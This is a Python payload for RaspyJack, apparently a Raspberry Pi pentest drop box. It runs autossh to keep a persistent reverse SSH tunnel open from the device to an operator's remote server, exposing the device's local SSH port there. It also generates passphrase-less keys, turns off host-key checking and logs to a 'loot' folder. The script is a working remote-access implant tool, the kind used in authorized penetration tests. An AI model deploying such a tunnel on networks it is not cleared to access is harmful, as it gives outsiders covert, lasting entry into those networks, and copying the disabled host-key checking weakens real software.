#!/usr/bin/env python3
"""
RaspyJack Payload -- Persistent Reverse SSH Tunnel
===================================================
Author: 7h30th3r0n3

Establishes a persistent reverse SSH tunnel using autossh with
automatic reconnection. Config stored in JSON.

Setup / Prerequisites:
  - Requires autossh: apt install autossh
  - Edit config at /root/Raspyjack/config/reverse_ssh/config.json with
    remote_host, remote_user.
  - Generate SSH key with KEY2, then add the public key to the
    remote server's authorized_keys.

Controls:
  OK         -- Start / stop tunnel
  UP / DOWN  -- Scroll config fields
  LEFT / RIGHT -- Edit values (cycle presets or increment port)
  KEY1       -- Test SSH connection
  KEY2       -- Generate SSH keypair
  KEY3       -- Exit

Config: /root/Raspyjack/config/reverse_ssh/config.json
  Fields: remote_host, remote_port, remote_user, ssh_key_path,
          local_forward_port
"""

import os
import sys
import time
import json
import subprocess
import threading
import signal
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = "/root/Raspyjack/loot/ReverseSSH"
CONFIG_DIR = "/root/Raspyjack/config/reverse_ssh"
CONFIG_PATH = os.path.join(CONFIG_DIR, "config.json")
KEY_DIR = os.path.join(CONFIG_DIR, "keys")
DEBOUNCE = 0.25

os.makedirs(LOOT_DIR, exist_ok=True)
os.makedirs(CONFIG_DIR, exist_ok=True)
os.makedirs(KEY_DIR, exist_ok=True)

DEFAULT_CONFIG = {
    "remote_host": "your.server.com",
    "remote_port": 2222,
    "remote_user": "tunnel",
    "ssh_key_path": os.path.join(KEY_DIR, "id_rsa_tunnel"),
    "local_forward_port": 22,
}

# Presets for cycling through values
HOST_PRESETS = [
    "your.server.com",
    "192.168.1.100",
    "10.0.0.1",
    "vps.example.com",
]

USER_PRESETS = ["tunnel", "root", "pi", "admin", "deploy"]
PORT_STEP = 1
PORT_MIN = 1024
PORT_MAX = 65535

# Config field ordering for UI navigation
CONFIG_FIELDS = [
    "remote_host",
    "remote_port",
    "remote_user",
    "ssh_key_path",
    "local_forward_port",
]

FIELD_LABELS = {
    "remote_host": "Host",
    "remote_port": "R.Port",
    "remote_user": "User",
    "ssh_key_path": "Key",
    "local_forward_port": "L.Port",
}

# ---------------------------------------------------------------------------
# Thread-safe state
# ---------------------------------------------------------------------------
_lock = threading.Lock()
_state = {
    "config": dict(DEFAULT_CONFIG),
    "selected_field": 0,
    "tunnel_status": "disconnected",  # connecting, connected, disconnected
    "tunnel_running": False,
    "uptime_start": None,
    "last_message": "",
    "autossh_proc": None,
}


def _get_state():
    with _lock:
        return {
            "config": dict(_state["config"]),
            "selected_field": _state["selected_field"],
            "tunnel_status": _state["tunnel_status"],
            "tunnel_running": _state["tunnel_running"],
            "uptime_start": _state["uptime_start"],
            "last_message": _state["last_message"],
        }


def _set_state(**kwargs):
    with _lock:
        for k, v in kwargs.items():
            _state[k] = v


def _get_proc():
    with _lock:
        return _state["autossh_proc"]


def _set_proc(proc):
    with _lock:
        _state["autossh_proc"] = proc


# ---------------------------------------------------------------------------
# Config persistence
# ---------------------------------------------------------------------------
def _load_config():
    """Load config from JSON file or create default."""
    if os.path.isfile(CONFIG_PATH):
        try:
            with open(CONFIG_PATH, "r") as f:
                loaded = json.load(f)
            # Merge with defaults for any missing keys
            merged = {**DEFAULT_CONFIG, **loaded}
            _set_state(config=merged)
            return
        except (json.JSONDecodeError, PermissionError):
            pass
    _set_state(config=dict(DEFAULT_CONFIG))
    _save_config()


def _save_config():
    """Persist current config to JSON."""
    st = _get_state()
    try:
        with open(CONFIG_PATH, "w") as f:
            json.dump(st["config"], f, indent=2)
    except Exception:
        _set_state(last_message="Save failed!")


# ---------------------------------------------------------------------------
# SSH keypair generation
# ---------------------------------------------------------------------------
def _generate_keypair():
    """Generate a new SSH keypair for the tunnel."""
    _set_state(last_message="Generating key...")
    st = _get_state()
    key_path = st["config"]["ssh_key_path"]

    # Remove existing keys to avoid interactive prompt
    for suffix in ["", ".pub"]:
        path = key_path + suffix
        if os.path.isfile(path):
            os.remove(path)

    try:
        result = subprocess.run(
            [
                "ssh-keygen",
                "-t", "rsa",
                "-b", "4096",
                "-f", key_path,
                "-N", "",  # no passphrase
                "-C", "raspyjack-tunnel",
            ],
            capture_output=True, text=True, timeout=30,
        )
        if result.returncode == 0:
            _set_state(last_message="Key generated!")
            # Log the public key path for easy deployment
            pub_path = key_path + ".pub"
            if os.path.isfile(pub_path):
                with open(pub_path, "r") as f:
                    pub_key = f.read().strip()
                log_path = os.path.join(LOOT_DIR, "public_key.txt")
                with open(log_path, "w") as f:
                    f.write(pub_key + "\n")
                    f.write(f"\n# Add to remote authorized_keys:\n")
                    f.write(f"# echo '{pub_key}' >> ~/.ssh/authorized_keys\n")
        else:
            _set_state(last_message=f"Keygen err: {result.stderr[:20]}")
    except FileNotFoundError:
        _set_state(last_message="ssh-keygen not found")
    except Exception as exc:
        _set_state(last_message=f"Error: {str(exc)[:18]}")


# ---------------------------------------------------------------------------
# Connection test
# ---------------------------------------------------------------------------
def _test_connection():
    """Test SSH connectivity to remote host."""
    _set_state(last_message="Testing...")

    st = _get_state()
    cfg = st["config"]

    cmd = [
        "ssh",
        "-o", "BatchMode=yes",
        "-o", "ConnectTimeout=10",
        "-o", "StrictHostKeyChecking=no",
        "-p", "22",
    ]

    key_path = cfg["ssh_key_path"]
    if os.path.isfile(key_path):
        cmd.extend(["-i", key_path])

    cmd.extend([
        f"{cfg['remote_user']}@{cfg['remote_host']}",
        "echo", "ok",
    ])

    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=15,
        )
        if result.returncode == 0:
            _set_state(last_message="Connection OK!")
        else:
            err = result.stderr.strip().split("\n")[-1] if result.stderr else "Failed"
            _set_state(last_message=f"Fail: {err[:18]}")
    except subprocess.TimeoutExpired:
        _set_state(last_message="Timeout (10s)")
    except FileNotFoundError:
        _set_state(last_message="ssh not found!")
    except Exception as exc:
        _set_state(last_message=f"Err: {str(exc)[:18]}")


# ---------------------------------------------------------------------------
# Tunnel management
# ---------------------------------------------------------------------------
def _start_tunnel():
    """Start autossh reverse tunnel."""
    if _get_state()["tunnel_running"]:
        return

    _set_state(
        tunnel_status="connecting",
        tunnel_running=True,
        last_message="Starting tunnel...",
    )

    thread = threading.Thread(target=_tunnel_worker, daemon=True)
    thread.start()


def _tunnel_worker():
    """Background worker that runs autossh."""
    st = _get_state()
    cfg = st["config"]

    cmd = [
        "autossh",
        "-M", "0",
        "-o", "ServerAliveInterval 30",
        "-o", "ServerAliveCountMax 3",
        "-o", "StrictHostKeyChecking=no",
        "-o", "ExitOnForwardFailure=yes",
        "-N",
        "-R", f"{cfg['remote_port']}:localhost:{cfg['local_forward_port']}",
        f"{cfg['remote_user']}@{cfg['remote_host']}",
    ]

    key_path = cfg["ssh_key_path"]
    if os.path.isfile(key_path):
        cmd.extend(["-i", key_path])

    env = dict(os.environ)
    env["AUTOSSH_GATETIME"] = "0"
    env["AUTOSSH_POLL"] = "30"

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            env=env,
        )
        _set_proc(proc)
        _set_state(
            tunnel_status="connected",
            uptime_start=time.time(),
            last_message="Tunnel active",
        )

        # Log tunnel start
        _log_event("tunnel_started", cfg)

        # Wait for process to exit
        proc.wait()

        exit_code = proc.returncode
        _set_state(
            tunnel_status="disconnected",
            tunnel_running=False,
            uptime_start=None,
            last_message=f"Tunnel exited ({exit_code})",
        )
        _set_proc(None)

    except FileNotFoundError:
        _set_state(
            tunnel_status="disconnected",
            tunnel_running=False,
            last_message="autossh not found!",
        )
        _set_proc(None)
    except Exception as exc:
        _set_state(
            tunnel_status="disconnected",
            tunnel_running=False,
            last_message=f"Err: {str(exc)[:18]}",
        )
        _set_proc(None)


def _stop_tunnel():
    """Stop the running autossh tunnel."""
    proc = _get_proc()
    if proc is not None:
        _set_state(last_message="Stopping tunnel...")
        try:
            proc.terminate()
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait(timeout=3)
        except Exception:
            pass
        _set_proc(None)

    _set_state(
        tunnel_status="disconnected",
        tunnel_running=False,
        uptime_start=None,
        last_message="Tunnel stopped",
    )
    _log_event("tunnel_stopped", {})


def _log_event(event_type, details):
    """Append event to log file."""
    log_path = os.path.join(LOOT_DIR, "tunnel_log.jsonl")
    entry = {
        "timestamp": datetime.now().isoformat(),
        "event": event_type,
        "details": details,
    }
    try:
        with open(log_path, "a") as f:
            f.write(json.dumps(entry) + "\n")
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Field editing
# ---------------------------------------------------------------------------
def _cycle_field_value(direction):
    """Cycle or increment the selected config field value."""
    st = _get_state()
    field = CONFIG_FIELDS[st["selected_field"]]
    cfg = dict(st["config"])
    current = cfg[field]

    if field == "remote_host":
        presets = HOST_PRESETS
        try:
            idx = presets.index(current)
        except ValueError:
            idx = -1
        new_idx = (idx + direction) % len(presets)
        cfg[field] = presets[new_idx]

    elif field == "remote_user":
        presets = USER_PRESETS
        try:
            idx = presets.index(current)
        except ValueError:
            idx = -1
        new_idx = (idx + direction) % len(presets)
        cfg[field] = presets[new_idx]

    elif field in ("remote_port", "local_forward_port"):
        new_val = int(current) + (direction * PORT_STEP)
        new_val = max(PORT_MIN, min(PORT_MAX, new_val))
        cfg[field] = new_val

    elif field == "ssh_key_path":
        # Cycle between available key files
        key_files = _find_key_files()
        if key_files:
            try:
                idx = key_files.index(current)
            except ValueError:
                idx = -1
            new_idx = (idx + direction) % len(key_files)
            cfg[field] = key_files[new_idx]

    _set_state(config=cfg)
    _save_config()


def _find_key_files():
    """Find SSH key files in the key directory and common locations."""
    paths = []
    search_dirs = [KEY_DIR, os.path.expanduser("~/.ssh")]
    for d in search_dirs:
        if os.path.isdir(d):
            for fname in sorted(os.listdir(d)):
                fpath = os.path.join(d, fname)
                if (
                    os.path.isfile(fpath)
                    and not fname.endswith(".pub")
                    and not fname.endswith(".txt")
                    and "known_hosts" not in fname
                    and "config" not in fname
                ):
                    paths.append(fpath)
    return paths if paths else [DEFAULT_CONFIG["ssh_key_path"]]


# ---------------------------------------------------------------------------
# Uptime formatting
# ---------------------------------------------------------------------------
def _format_uptime(start_time):
    """Return human-readable uptime string."""
    if start_time is None:
        return "0s"
    elapsed = int(time.time() - start_time)
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    if hours > 0:
        return f"{hours}h{minutes}m{seconds}s"
    elif minutes > 0:
        return f"{minutes}m{seconds}s"
    return f"{seconds}s"


# ---------------------------------------------------------------------------
# LCD drawing
# ---------------------------------------------------------------------------
STATUS_COLORS = {
    "connecting": "#FFAA00",
    "connected": "#00FF00",
    "disconnected": "#FF4444",
}


def _draw_lcd():
    """Render current state on LCD."""
    st = _get_state()
    cfg = st["config"]
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    # Header
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "REV SSH", font=font, fill="#00AAFF")
    status = st["tunnel_status"]
    status_color = STATUS_COLORS.get(status, "#888")
    d.ellipse((100, 3, 108, 11), fill=status_color)
    d.text((110, 1), status[:4].upper(), font=font, fill=status_color)

    # Uptime
    uptime_str = _format_uptime(st["uptime_start"])
    d.text((2, 16), f"Up: {uptime_str}", font=font, fill="#888")

    # Remote endpoint summary
    endpoint = f"{cfg['remote_user']}@{cfg['remote_host']}"
    d.text((2, 28), endpoint[:21], font=font, fill="#AAAAAA")
    d.text((2, 40), f"R:{cfg['remote_port']} -> L:{cfg['local_forward_port']}", font=font, fill="#AAAAAA")

    # Config fields
    y_start = 54
    for i, field in enumerate(CONFIG_FIELDS):
        y = y_start + i * 11
        if y > 105:
            break
        label = FIELD_LABELS[field]
        value = str(cfg[field])
        # Truncate key path for display
        if field == "ssh_key_path":
            value = os.path.basename(value)[:10]
        else:
            value = value[:12]

        is_selected = (i == st["selected_field"])
        fg = "#FFFFFF" if is_selected else "#666666"
        bg = "#333355" if is_selected else None

        if bg:
            d.rectangle((0, y, 127, y + 10), fill=bg)
        d.text((2, y), f"{label}:", font=font, fill="#888888")
        d.text((50, y), value, font=font, fill=fg)

        if is_selected:
            d.text((120, y), "<>", font=font, fill="#FFAA00")

    # Message line
    d.rectangle((0, 106, 127, 115), fill="#0A0A0A")
    d.text((2, 106), st["last_message"][:21], font=font, fill="#FFCC00")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    action = "STOP" if st["tunnel_running"] else "START"
    d.text((2, 117), f"OK:{action} K1:Test K3:Quit", font=font, fill="#AAA")

    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    _load_config()

    # Show splash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((4, 20), "REVERSE SSH", font=font, fill="#00AAFF")
    d.text((4, 36), "Persistent Tunnel", font=font, fill="#888")
    d.text((4, 56), "OK=Start/Stop", font=font, fill="#666")
    d.text((4, 68), "U/D=Field L/R=Edit", font=font, fill="#666")
    d.text((4, 80), "K1=Test K2=Keygen", font=font, fill="#666")
    d.text((4, 92), "K3=Exit", font=font, fill="#666")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(1.5)

    try:
        while True:
            _draw_lcd()
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                break

            elif btn == "OK":
                st = _get_state()
                if st["tunnel_running"]:
                    _stop_tunnel()
                else:
                    _start_tunnel()
                time.sleep(DEBOUNCE)

            elif btn == "UP":
                st = _get_state()
                new_idx = max(0, st["selected_field"] - 1)
                _set_state(selected_field=new_idx)
                time.sleep(DEBOUNCE)

            elif btn == "DOWN":
                st = _get_state()
                new_idx = min(len(CONFIG_FIELDS) - 1, st["selected_field"] + 1)
                _set_state(selected_field=new_idx)
                time.sleep(DEBOUNCE)

            elif btn == "LEFT":
                _cycle_field_value(-1)
                time.sleep(DEBOUNCE)

            elif btn == "RIGHT":
                _cycle_field_value(1)
                time.sleep(DEBOUNCE)

            elif btn == "KEY1":
                threading.Thread(
                    target=_test_connection, daemon=True,
                ).start()
                time.sleep(DEBOUNCE)

            elif btn == "KEY2":
                threading.Thread(
                    target=_generate_keypair, daemon=True,
                ).start()
                time.sleep(DEBOUNCE)

            time.sleep(0.05)

    finally:
        _stop_tunnel()
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
